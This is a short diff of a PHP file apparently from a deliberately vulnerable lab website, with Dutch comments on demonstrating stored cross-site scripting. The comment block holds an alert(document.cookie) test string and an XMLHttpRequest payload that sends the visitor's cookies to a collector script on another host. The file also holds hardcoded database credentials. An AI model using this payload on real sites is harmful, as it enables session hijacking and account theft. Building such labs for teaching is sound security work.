@@ -10,11 +10,11 @@
 /*
  * Maak een nieuwe user aan met naam "jantje" en wachtwoord "<script>alert(document.cookie)</script>"
  * Of nog beter:
- * <script>
- * var http = new XMLHttpRequest();
- * http.open('GET', 'http://192.168.65.35/post.php?cookie='+ encodeURIComponent(document.cookie),true);
- * http.send(null);
- * </script>
+<script>
+var http = new XMLHttpRequest();
+http.open(\'GET\', \'http://192.168.161.128/~janjaap/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
+http.send(null);
+</script>
  */
 
 $link = mysqli_connect("localhost", "pipo", "declown", "vulnerable_db");
@@ -42,5 +42,5 @@ while($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
 ?>
 
 <script>
-    console.log(document.cookie);
+    //console.log(document.cookie);
 </script>
